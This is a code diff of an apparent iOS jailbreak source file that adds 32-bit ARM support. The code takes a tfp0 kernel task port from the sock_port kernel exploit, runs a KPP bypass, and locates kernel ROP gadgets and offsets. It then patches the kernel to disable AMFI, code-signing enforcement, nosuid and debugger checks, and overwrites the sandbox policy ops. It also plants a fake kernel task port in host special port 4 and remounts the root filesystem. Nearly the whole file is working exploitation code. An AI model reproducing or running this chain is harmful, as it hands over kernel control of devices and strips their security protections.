@@ -6,7 +6,6 @@
 //  Copyright © 2018 tihmstar. All rights reserved.
 //
 
-extern "C"{
 #include <stdio.h>
 #include <stdint.h>
 #include <CoreFoundation/CoreFoundation.h>
@@ -14,7 +13,6 @@ extern "C"{
 
 #include <mach/mach.h>
 #include "common.h"
-#include "offsets.h"
 #include "kutil.h"
 #include "kernel_memory.h"
 #include <IOKit/IOKitLib.h>
@@ -34,24 +32,92 @@ extern "C"{
 #include <sys/stat.h>
 #include <copyfile.h>
 extern int (*dsystem)(const char *);
-#include "pte_stuff.h"
+#if __arm64__
+#include "pte_stuff_64.h"
+#endif
 #include "sbops.h"
-}
+
+#include "offsets.h"
 #include <unordered_set>
 #include <vector>
 #include <pthread.h>
-#include <liboffsetfinder64/liboffsetfinder64.hpp>
 
 #define postProgress(prg) [[NSNotificationCenter defaultCenter] postNotificationName: @"JB" object:nil userInfo:@{@"JBProgress": prg}]
 
-#define KBASE 0xfffffff007004000
+#define KBASE ((kptr_t)fi.linker_base())
 mach_port_t tfp0 = 0;
 static kptr_t kbase;
 
-static void kpp(uint64_t kernbase, uint64_t slide);
+static void kpp(uintptr_t kernbase, uintptr_t slide);
 static void runLaunchDaemons(void);
 
-static tihmstar::offsetfinder64 fi("/System/Library/Caches/com.apple.kernelcaches/kernelcache");
+dispatch_queue_t jailbreak_queue;
+static offsetfinder *_fi;
+static offsets_t *_off = NULL;
+#define fi (*_fi)
+
+extern size_t
+get_add_x0_x0_0x40_ret(void) {
+    static kptr_t addr = 0;
+    if (addr == 0) {
+#if __arm64__
+        addr = kbase + (kptr_t)fi.find_rop_add_x0_x0_0x40() - KBASE;
+#else
+        addr = kbase + (kptr_t)fi.find_rop_add_r0_r0_0x40() - KBASE;
+#endif
+    }
+    return addr;
+}
+extern size_t
+get_IOMalloc(void) {
+    static kptr_t addr = 0;
+    if (addr == 0) {
+        addr = kbase + (kptr_t)fi.find_IOMalloc() - KBASE;
+    }
+    return addr;
+}
+
+extern size_t
+get_IOFree(void) {
+    static kptr_t addr = 0;
+    if (addr == 0) {
+        addr = kbase + (kptr_t)fi.find_IOFree() - KBASE;
+    }
+    return addr;
+}
+
+extern size_t
+get_vtab_get_external_trap_for_index(void) {
+    static size_t addr = 0;
+    if (addr == 0) {
+        addr = (kptr_t)fi.find_vtab_get_external_trap_for_index();
+    }
+    return addr;
+}
+
+static void __attribute__((constructor))
+$ctor(void) {
+    dispatch_queue_attr_t qos = dispatch_queue_attr_make_with_qos_class(DISPATCH_QUEUE_SERIAL, QOS_CLASS_USER_INTERACTIVE, 0);
+    jailbreak_queue = dispatch_queue_create("com.sxx.jailbreak", qos);
+    dispatch_async(jailbreak_queue, ^{
+        _fi = new offsetfinder("/System/Library/Caches/com.apple.kernelcaches/kernelcache");
+        try {
+            _off = get_offsets(&fi);
+#if __arm64__
+        } catch (tihmstar::exception &e) {
+            LOG("Failed jailbreak!: %s [%u]", e.what(), e.code());
+            NSString *err = [NSString stringWithFormat:@"Offset Error: %d",e.code()];
+            postProgress(err);
+            return;
+#endif
+        } catch (std::exception &e) {
+            LOG("Failed jailbreak!: %s", e.what());
+            NSString *err = [NSString stringWithFormat:@"FATAL offset Error:\n%s",e.what()];
+            postProgress(err);
+            return;
+        }
+    });
+}
 
 void suspend_all_threads() {
     thread_act_t other_thread, current_thread;
@@ -99,7 +165,7 @@ void resume_all_threads() {
     }
 }
 
-static bool set_hgsp4(task_t tfp0, task_t port, kptr_t kbase);
+static bool set_hgsp4(task_t port, kptr_t kbase);
 extern "C" int
 init_kernel(size_t (*kread)(uint64_t, void *, size_t), kptr_t kernel_base, const char *filename);
 extern "C" uint64_t find_panic(void);
@@ -114,7 +180,7 @@ kern_return_t cb(task_t tfp0_, kptr_t kbase, void *data){
         return -1;
     }
     LOG("setting hgsp4\n");
-    bool ret3 = set_hgsp4(tfp0, tfp0, kbase);
+    bool ret3 = set_hgsp4(tfp0, kbase);
     if (!ret3) {
         postProgress(@"set_hgsp4 failed!");
         return -1;
@@ -130,7 +196,7 @@ kern_return_t cb(task_t tfp0_, kptr_t kbase, void *data){
         LOG("Set pthread priority: %d\n", sp.sched_priority);
     }
        
-    
+#if __arm64__
     std::vector<processor_t> exited_processor;
     exited_processor.reserve(10);
     
@@ -156,7 +222,7 @@ kern_return_t cb(task_t tfp0_, kptr_t kbase, void *data){
         }
         
         for (proc = 0; proc < procCount; proc++) {
-            printf("Processor %d\n", processorPorts[proc]);
+            printf("Processor[%d] %d\n", proc, processorPorts[proc]);
             if (proc > 0) {
                 exited_processor.push_back(processorPorts[proc]);
                 kr = processor_exit(processorPorts[proc]);
@@ -166,6 +232,7 @@ kern_return_t cb(task_t tfp0_, kptr_t kbase, void *data){
             }
         }
     }
+#endif
     
     resume_all_threads();
     try {
@@ -173,9 +240,10 @@ kern_return_t cb(task_t tfp0_, kptr_t kbase, void *data){
     } catch (tihmstar::exception &e) {
         LOG("Failed jailbreak!: %s [%u]", e.what(), e.code());
         NSString *err = [NSString stringWithFormat:@"Error: %d",e.code()];
-        postProgress(err);
+       postProgress(err);
     }
     
+#if __arm64__
     for (auto &p : exited_processor) {
         if (p == MACH_PORT_NULL) {
             continue;
@@ -195,6 +263,7 @@ kern_return_t cb(task_t tfp0_, kptr_t kbase, void *data){
             }
         }
     }
+#endif
     
     term_kexec();
     LOG("done kernelpatches!");
@@ -203,10 +272,12 @@ kern_return_t cb(task_t tfp0_, kptr_t kbase, void *data){
     return KERN_SUCCESS;
 }
 
-uint64_t physalloc(uint64_t size) {
+#if __arm64__
+static uintptr_t
+physalloc(size_t size) {
     uint64_t ret = 0;
     mach_vm_allocate(tfp0, (mach_vm_address_t*) &ret, size, VM_FLAGS_ANYWHERE);
-    return ret;
+    return (uintptr_t)ret;
 }
 
 #define PSZ (isvad ? 0x1000 : 0x4000)
@@ -310,45 +381,78 @@ static void RemapPage(uint64_t x, uint64_t length) {
         kernel_bcopy(src, dst, size);
     });
 }
+#else
+#define PSZ (0x1000)
+#define PMK (PSZ-1)
+static kptr_t gPhysBase, gVirtBase;
 
-struct _new_thread_context {
-    processor_t new_processor;
-    processor_t active_processor;
-    thread_t thread;
-    uint64_t *thread_buffer;
-    kptr_t thread_addr;
-};
-
-__attribute__((unused))
-static void *_new_thread(void *context) {
-    auto &c = *(struct _new_thread_context*)context;
-    thread_suspend(c.thread);
-    kern_return_t ret = processor_start(c.new_processor);
-    
-    if (ret != KERN_SUCCESS) {
-        LOG("processor_start failed: %s\n", mach_error_string(ret));
-        return (void*)-1;
-    }
-    
-    uint64_t new_processor_addr = get_address_of_port(proc_struct_addr(), c.new_processor);
-    
-    kwrite_uint64(c.thread_addr + 37 * 8, new_processor_addr);
-    thread_resume(c.thread);
-    
-    return NULL;
+static ppnum_t
+kernel_pmap_find_phys(uintptr_t pmap, uint64_t va) {
+    uint32_t va_lo = (uint32_t)va;
+    uint32_t va_hi = va >> 32;
+    return kexec((kptr_t)fi.find_pmap_find_phys() + kbase - KBASE + 1, pmap, va_lo, va_hi, 0, 0, 0, 0);
 }
 
-void kpp(uint64_t kernbase, uint64_t slide) {
-    postProgress(@"running KPP bypass");
-    checkvad();
+static void
+kernel_bcopy_phys(uint64_t src, uint64_t dst, size_t size) {
+    //kexec((kptr_t)fi.find_bcopy() + kbase - KBASE, src, dst, size, 0, 0, 0, 0);
+    uint32_t src_lo = (uint32_t)src;
+    uint32_t src_hi = src >> 32;
+    uint32_t dst_lo = (uint32_t)dst;
+    uint32_t dst_hi = dst >> 32;
+    
+    kexec((kptr_t)fi.find_bcopy_phys() + kbase - KBASE + 1, src_lo, src_hi, dst_lo, dst_hi, size, 0, 0);
+}
 
-    uint64_t entryp;
+static void
+kbcopy(uintptr_t pmap, uintptr_t src, uintptr_t dst, size_t size) {
+    if (size == 0) {
+        return;
+    }
+    uintptr_t vpg_src = src & ~PMK;
+    uintptr_t vpg_dst = dst & ~PMK;
+    ppnum_t pg_src = kernel_pmap_find_phys(pmap, src);
+    ppnum_t pg_dst = kernel_pmap_find_phys(pmap, dst);
+    size_t done = 0;
+    while (done < size) {
+        size_t remains = size - done;
+        size_t pg_src_remains = PSZ - (src & PMK);
+        size_t pg_dst_remains = PSZ - (dst & PMK);
+        size_t bulk = remains < pg_src_remains ? remains < pg_dst_remains ? remains : pg_dst_remains : pg_src_remains < pg_dst_remains ? pg_src_remains : pg_dst_remains;
+        kernel_bcopy_phys((pg_src << 12) | (src & PMK), (pg_dst << 12) | (dst & PMK), bulk);
+        src += bulk;
+        dst += bulk;
+        done += bulk;
+        if (vpg_src != (src & ~PMK)) {
+            vpg_src = src & ~PMK;
+            pg_src = kernel_pmap_find_phys(pmap, src);
+        }
+        if (vpg_dst != (dst & ~PMK)) {
+            vpg_dst = dst & ~PMK;
+            pg_dst = kernel_pmap_find_phys(pmap, dst);
+        }
+    }
+}
+#endif
 
-    uint64_t gStoreBase = (uint64_t)fi.find_gPhysBase() + slide;
-    uint64_t ptr2[2];
+static void
+kpp(uintptr_t kernbase, uintptr_t slide) {
+    uintptr_t gStoreBase = (uintptr_t)fi.find_gPhysBase() + slide;
+    uintptr_t ptr2[2];
+#if __arm64__
     kread(gStoreBase, ptr2, sizeof(ptr2));
     gPhysBase = ptr2[0];
     gVirtBase = ptr2[1];
+#else
+    kread(gStoreBase - sizeof(uintptr_t), ptr2, sizeof(ptr2));
+    gPhysBase = ptr2[1];
+    gVirtBase = ptr2[0];
+#endif
+    printf("gPhysBase: " ADDR " gVirtBase: " ADDR "\n", gPhysBase, gVirtBase);
+#if __arm64__
+    postProgress(@"running KPP bypass");
+    checkvad();
+    uint64_t entryp;
 
     entryp = (uint64_t)fi.find_entry() + slide;
     uint64_t rvbar = entryp & (~0xFFF);
@@ -708,34 +812,34 @@ void kpp(uint64_t kernbase, uint64_t slide) {
     for (int i = 0; i < z; i++) {
         WriteAnywhere64(plist[i], physcode + 0x100);
     }
+#else
+    uintptr_t kernel_pmap = kread_uintptr((uintptr_t)fi.find_kernel_pmap() + slide);
+#endif
 
     //kernelpatches
     postProgress(@"patching kernel");
 
-    std::vector<tihmstar::patchfinder64::patch> kernelpatches;
-    kernelpatches.push_back(fi.find_i_can_has_debugger_patch_off());
+    auto kernelpatches = fi.all_patches();
 
-    std::vector<tihmstar::patchfinder64::patch> nosuid = fi.find_nosuid_off();
-
-    kernelpatches.push_back(fi.find_remount_patch_offset());
-    kernelpatches.push_back(fi.find_lwvm_patch_offsets());
-    kernelpatches.push_back(nosuid.at(0));
-    kernelpatches.push_back(nosuid.at(1));
-    kernelpatches.push_back(fi.find_proc_enforce());
-    kernelpatches.push_back(fi.find_amfi_patch_offsets());
-    kernelpatches.push_back(fi.find_cs_enforcement_disable_amfi());
-    kernelpatches.push_back(fi.find_amfi_substrate_patch());
-    kernelpatches.push_back(fi.find_nonceEnabler_patch());
-
-    auto dopatch = [&](tihmstar::patchfinder64::patch &patch){
+    auto dopatch = [=](tihmstar::patchfinder64::patch &patch){
         patch.slide(slide);
+#if DEBUG
         NSString * str = @"patching at: %p [";
         for (int i = 0; i<patch._patchSize; i++) {
             str = [NSString stringWithFormat:@"%@%02x",str,*((uint8_t*)patch._patch+i)];
         }
         NSLog([str stringByAppendingString:@"]"],patch._location);
+#endif
+#if __arm64__
         RemapPage((uint64_t)patch._location + slide, patch._patchSize);
         kwrite(NewPointer((uint64_t)patch._location + slide), patch._patch, patch._patchSize);
+#else
+        uintptr_t kbuffer = kalloc(patch._patchSize);
+        kwrite(kbuffer, patch._patch, patch._patchSize);
+        kbcopy(kernel_pmap, kbuffer, (uintptr_t)patch._location + slide, patch._patchSize);
+        kfree(kbuffer, patch._patchSize);
+#endif
+        
     };
 
 
@@ -745,14 +849,12 @@ void kpp(uint64_t kernbase, uint64_t slide) {
     
     postProgress(@"fetching sandbox");
     
-    uint64_t sbops = (uint64_t)fi.find_sbops() + slide;
-    uint64_t sbops_end = sbops + sizeof(struct mac_policy_ops);
-    uint64_t sbops_start_page = sbops & (~PMK);
-    uint64_t sbops_end_page = (sbops_end + PMK) & (~PMK);
-    //uint64_t sbops_end_offset = sbops_end - (sbops_end & (~PMK));
-    uint64_t nopag = (sbops_end_page - sbops_start_page) / PSZ;
+    const uintptr_t sbops = (uintptr_t)fi.find_sbops() + slide;
+    const uintptr_t sbops_end = sbops + sizeof(struct mac_policy_ops);
+    const uintptr_t sbops_start_page = sbops & (~PMK);
+    const uintptr_t sbops_end_page = (sbops_end + PMK) & (~PMK);
     
-    NSLog(@"Found sbops 0x%llx size: %lld\n", sbops, sbops_end_page - sbops);
+    printf("Found sbops 0x%lx size: %ld\n", sbops, sbops_end_page - sbops);
     
     void *buf = malloc(sbops_end_page - sbops_start_page);
     
@@ -801,7 +903,8 @@ void kpp(uint64_t kernbase, uint64_t slide) {
 
     postProgress(@"remapping sandbox");
     
-
+#if __arm64__
+    const uintptr_t nopag = (sbops_end_page - sbops_start_page) / PSZ;
     for (int i = 0; i < nopag; i++) {
         RemapPageWithCB(sbops_start_page + i * (PSZ), PSZ, ^(kptr_t dst, kptr_t src, int level, size_t size) {
             if (level != 3) {
@@ -811,52 +914,48 @@ void kpp(uint64_t kernbase, uint64_t slide) {
             }
         });
     }
+#else
+    kwrite(sbops_start_page, buf, sbops_end_page - sbops_start_page);
+#endif
     
     free(buf);
     buf = nullptr;
     postProgress(@"setting Marijuan");
     
-    uint64_t marijuanoff = (uint64_t)fi.find_release_arm() + slide;
+    uintptr_t marijuanoff = (uintptr_t)fi.find_release_arm() + slide;
 
     // smoke trees
-    const char Marijuan[] = {'M', 'a', 'r', 'i', 'j', 'u', 'a', 'n'};
+    static const char Marijuan[] = {'M', 'a', 'r', 'i', 'j', 'u', 'a', 'n'};
+#if __arm64__
     RemapPage(marijuanoff, sizeof(Marijuan));
     WriteAnywhere64(NewPointer(marijuanoff), *(uint64_t*)Marijuan);
+#else
+    uintptr_t kbuffer = kmem_alloc(sizeof(Marijuan));
+    kwrite(kbuffer, Marijuan, sizeof(Marijuan));
+    kbcopy(kernel_pmap, kbuffer, marijuanoff, sizeof(Marijuan));
+    kfree(kbuffer, sizeof(Marijuan));
+#endif
+#if __arm64__
     set_ttbr1_kfunc(physp);
     flush_all_cache_kfunc();
     flush_tlb_kfunc();
-    
+#endif
     postProgress(@"i_can_has_debugger?");
     
-//    {
-//        uint64_t thread_addr = get_address_of_port(proc_struct_addr(), mach_thread_self());
-//        //uint64_t *buffer = (uint64_t*)malloc(0x4a0); //iOS 10.3.3 struct thread size is 0x4B8
-//        //kread(thread_addr, buffer, 0x4A0);
-//        pthread_t p;
-//        struct _new_thread_context c = {
-//            new_proc, active_proc, mach_thread_self(), nullptr, thread_addr
-//        };
-//        pthread_create(&p, nullptr, _new_thread, (void*)&c);
-//        void *ret;
-//        pthread_join(p, &ret);
-//        if (ret != nullptr) {
-//            postProgress(@"Failed to switch context");
-//            return;
-//        }
-//        new_proc = MACH_PORT_NULL;
-//    }
     //check for i_can_has_debugger
     uint32_t i_can_has_debugger;
-    auto ichd_patch = fi.find_i_can_has_debugger_patch_off();
+    auto &ichd_patch = fi.find_i_can_has_debugger_patch_off();
+#if __arm64__ && DEBUG
     uint64_t phyaddr = kexec(address_translation_addr, (uint64_t)ichd_patch._location + slide, 0, 0, 0, 0, 0, 0);
     NSLog(@"i_can_has_debugger phy: %llx %llx\n", phyaddr, findphys_real((uint64_t)ichd_patch._location + slide));
-    while ((i_can_has_debugger = ReadAnywhere32((uint64_t)ichd_patch._location + slide)) != 1) {
-        //kwrite(NewPointer((uint64_t)ichd_patch._location + slide), ichd_patch._patch, ichd_patch._patchSize);
-        //printf("i_can_has_debugger %d %d\n", i_can_has_debugger, ReadAnywhere32(NewPointer((uint64_t)ichd_patch._location + slide)));
+#endif
+    while ((i_can_has_debugger = ReadAnywhere32((uintptr_t)ichd_patch._location + slide)) != 1) {
         sleep(1);
     }
+#if __arm64__ && DEBUG
     phyaddr = kexec(address_translation_addr, (uint64_t)ichd_patch._location + slide, 0, 0, 0, 0, 0, 0);
     NSLog(@"i_can_has_debugger phy: %llx %llx\n", phyaddr, findphys_real((uint64_t)ichd_patch._location + slide));
+#endif
     
     postProgress(@"remounting rootfs");
     
@@ -880,7 +979,8 @@ void kpp(uint64_t kernbase, uint64_t slide) {
     NSLog(@"enabled patches");
 }
 
-void die(){
+static void
+die(){
     // open user client
     CFMutableDictionaryRef matching = IOServiceMatching("IOSurfaceRoot");
     io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, matching);
@@ -901,31 +1001,11 @@ typedef std::function<kern_return_t(task_t tfp0, kptr_t kbase, void *data)> jail
 
 static kern_return_t sock_port(offsets_t *off, jailbreak_cb_t callback, void *cb_data);
 
-static offsets_t *_off = NULL;
-
 static int _jailbreak_with_cb(const jailbreak_cb_t &cb) {
-
-    offsets_t *off = NULL;
-    try {
-        off = get_offsets(&fi);
-        _off = off;
-        
-    } catch (tihmstar::exception &e) {
-        LOG("Failed jailbreak!: %s [%u]", e.what(), e.code());
-        NSString *err = [NSString stringWithFormat:@"Offset Error: %d",e.code()];
-        postProgress(err);
-        return -1;
-    }catch (std::exception &e) {
-        LOG("Failed jailbreak!: %s", e.what());
-        NSString *err = [NSString stringWithFormat:@"FATAL offset Error:\n%s",e.what()];
-        postProgress(err);
-        return -1;
-    }
 
     LOG("sock_port\n");
     suspend_all_threads();
-    if (sock_port(off, cb, &fi)) {
-    //if(v0rtex(off, &cb, &fi)){
+    if (sock_port(_off, cb, &fi)) {
         resume_all_threads();
         postProgress(@"Kernelexploit failed");
         printf("Kernelexploit failed, goodbye...\n");
@@ -1031,10 +1111,12 @@ void runLaunchDaemons(void){
         }
         douicache = 1;
     }
+#if __arm64__
     struct passwd *p;
     if ((p = getpwnam("sxx")) != NULL) {
         douicache = 1;
     }
+#endif
 
     NSLog(@"Touching /.bearded_old_man_no_stash\n");
     easyPosixSpawn([NSURL fileURLWithPath:@"/bin/touch"], @[@"/.cydia_no_stash"]);
@@ -1092,7 +1174,7 @@ void runLaunchDaemons(void){
 
 @end
 
-extern "C" mach_port_t sock_port_get_tfp0(kptr_t *kbase, offsets_t *off);
+extern "C" mach_port_t sock_port_get_tfp0(kptr_t *kbase);
 
 extern "C" int jailbreak_system(const char *command) {
     NSBundle *utility = [[NSBundle alloc] initWithPath:@"/Library/Frameworks/CRJailbreakUtilities.framework"];
@@ -1121,21 +1203,15 @@ exploit_system:
     });
 }
 
-static kern_return_t sock_port(offsets_t *off, jailbreak_cb_t callback, void *cb_data) {
+static kern_return_t
+sock_port(offsets_t *off, jailbreak_cb_t callback, void *cb_data) {
     
-    mach_port_t tfp0 = sock_port_get_tfp0(&kbase, off);
+    mach_port_t tfp0 = sock_port_get_tfp0(&kbase);
     if (tfp0 == MACH_PORT_NULL) {
         return -1;
     }
     LOG("done sock port!\n");
     ::tfp0 = tfp0;
-    
-    LOG("Initing patchfinder\n");
-    int ret1 = init_kernel(kread, kbase, NULL);
-    if (ret1) {
-        postProgress(@"patchfinder64 failed");
-        return -1;
-    }
     
     kptr_t kernel_task_addr;
     kread(kbase + off->kernel_task - off->base, &kernel_task_addr, sizeof(kernel_task_addr));
@@ -1168,34 +1244,29 @@ static kern_return_t sock_port(offsets_t *off, jailbreak_cb_t callback, void *cb
 
 
 static bool
-set_hgsp4(task_t tfp0, task_t port, kptr_t kbase) {
+set_hgsp4(task_t port, kptr_t kbase) {
     offsets_t *off = _off;
     kern_return_t kr = KERN_FAILURE;
-    bool ret = false;
     host_t host = HOST_NULL;
     host = mach_host_self();
     kptr_t kernel_task_addr = 0;
-    size_t const sizeof_task = 0x1000;
     kread(kbase + off->kernel_task - off->base, &kernel_task_addr, sizeof(kernel_task_addr));
     if (kernel_task_addr == 0) {
         return false;
     }
     task_t zm_fake_task_port = TASK_NULL;
-    task_t km_fake_task_port = TASK_NULL;
     kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &zm_fake_task_port);
     if (kr != KERN_SUCCESS) {
         return false;
     }
-    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &km_fake_task_port);
-    if (kr != KERN_SUCCESS) {
-        return false;
-    }
+//    mach_port_insert_right(mach_task_self(), zm_fake_task_port, zm_fake_task_port, MACH_MSG_TYPE_MAKE_SEND);
+//    mach_port_insert_right(mach_task_self(), km_fake_task_port, km_fake_task_port, MACH_MSG_TYPE_MAKE_SEND);
     kptr_t zone_map = 0;
     kread(kbase + off->zone_map - off->base, &zone_map, sizeof(zone_map));
-    if (zone_map == 0) {
+    if (!KERN_POINTER_VALID(zone_map)) {
         return false;
     }
-    kptr_t kernel_map = kread_uint64(kernel_task_addr + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
+    kptr_t kernel_map = kread_uintptr(kernel_task_addr + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
     if (!KERN_POINTER_VALID(kernel_map)) {
         return false;
     }
@@ -1204,31 +1275,32 @@ set_hgsp4(task_t tfp0, task_t port, kptr_t kbase) {
     if (!KERN_POINTER_VALID(zm_fake_task_addr)) {
         return false;
     }
-    kptr_t km_fake_task_addr = make_fake_task(kernel_map);
-    if (!KERN_POINTER_VALID(km_fake_task_addr)) {
+//    kptr_t km_fake_task_addr = make_fake_task(kernel_map);
+//    if (!KERN_POINTER_VALID(km_fake_task_addr)) {
+//        return false;
+//    }
+    
+    struct port_kernel_context save;
+    if (!make_port_fake_task_port(zm_fake_task_port, zm_fake_task_addr, &save)) {
+        return false;
+    }
+    struct port_kernel_context save1;
+    if (!make_port_fake_task_port(zm_fake_task_port, zm_fake_task_addr, &save1)) {
         return false;
     }
     
-    if (!make_port_fake_task_port(zm_fake_task_port, zm_fake_task_addr)) {
-        return false;
-    }
-    
-    if (!make_port_fake_task_port(km_fake_task_port, km_fake_task_addr)) {
-        return false;
-    }
-    
-    km_fake_task_port = zm_fake_task_port;
+    //km_fake_task_port = zm_fake_task_port;
     vm_prot_t cur = VM_PROT_NONE, max = VM_PROT_NONE;
-    kptr_t remapped_task_addr = 0;
+    mach_vm_address_t remapped_task_addr = 0;
     
-    kr = mach_vm_remap(km_fake_task_port, &remapped_task_addr, sizeof_task, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, zm_fake_task_port, kernel_task_addr, 0, &cur, &max, VM_INHERIT_NONE);
+    kr = mach_vm_remap(zm_fake_task_port, &remapped_task_addr, fake_task_size, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, zm_fake_task_port, kernel_task_addr, 0, &cur, &max, VM_INHERIT_NONE);
     if (kr != KERN_SUCCESS) {
         return false;
     }
     if (remapped_task_addr == kernel_task_addr) {
         return false;
     }
-    kr = mach_vm_wire(host, km_fake_task_port, remapped_task_addr, sizeof_task, VM_PROT_READ | VM_PROT_WRITE);
+    kr = mach_vm_wire(host, zm_fake_task_port, remapped_task_addr, fake_task_size, VM_PROT_READ | VM_PROT_WRITE);
     if (kr != KERN_SUCCESS) {
         printf("Unable to wire kernel memory %s\n", mach_error_string(kr));
         return false;
@@ -1237,41 +1309,44 @@ set_hgsp4(task_t tfp0, task_t port, kptr_t kbase) {
     if(!KERN_POINTER_VALID(port_addr)) {
         return false;
     }
-    if (!make_port_fake_task_port(port, remapped_task_addr)) {
+    kptr_t port_task_addr = kread_uintptr(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+    if (!make_port_fake_task_port(port, (kptr_t)remapped_task_addr, NULL)) {
         return false;
     }
-    if(kread_uint64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) != remapped_task_addr) {
+    
+    if(kread_uintptr(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) != (uintptr_t)remapped_task_addr) {
         return false;
     }
+    kmem_free(port_task_addr, fake_task_size);
     kptr_t const host_priv_addr = get_address_of_port(proc_struct_addr(), host);
     if(!KERN_POINTER_VALID(host_priv_addr)) {
         return false;
     }
-    kptr_t const realhost_addr = kread_uint64(host_priv_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+    kptr_t const realhost_addr = kread_uintptr(host_priv_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
     if (!KERN_POINTER_VALID(realhost_addr)) {
         return false;
     }
     int const slot = 4;
-    if (!kwrite_uint64(realhost_addr + koffset(KSTRUCT_OFFSET_HOST_SPECIAL) + slot * sizeof(kptr_t), port_addr)) {
+    if (!kwrite_uintptr(realhost_addr + koffset(KSTRUCT_OFFSET_HOST_SPECIAL) + slot * sizeof(kptr_t), port_addr)) {
         return false;
     }
-    ret = true;
-out:
     
+    
+    restore_port(zm_fake_task_port, &save);
+    mach_port_deallocate(mach_task_self(), zm_fake_task_port);
     if (MACH_PORT_VALID(host)) mach_port_deallocate(mach_task_self(), host); host = HOST_NULL;
+    free_fake_task(zm_fake_task_addr);
     
     return true;
 }
 
-extern "C" uint64_t find_zone_map_ref(void);
-
 #define kCFCoreFoundationVersionNumber_iOS_11_0 1443.00
-extern "C" size_t get_zone_map_ref(void) {
+size_t get_zone_map_ref(void) {
     static kptr_t addr = 0;
     if (addr == 0) {
         //patchfinder64 do not support ios10
         if (kCFCoreFoundationVersionNumber >= kCFCoreFoundationVersionNumber_iOS_11_0) {
-            addr = find_zone_map_ref();
+            abort();
         } else {
             addr = kbase + _off->zone_map - _off->base;
         }
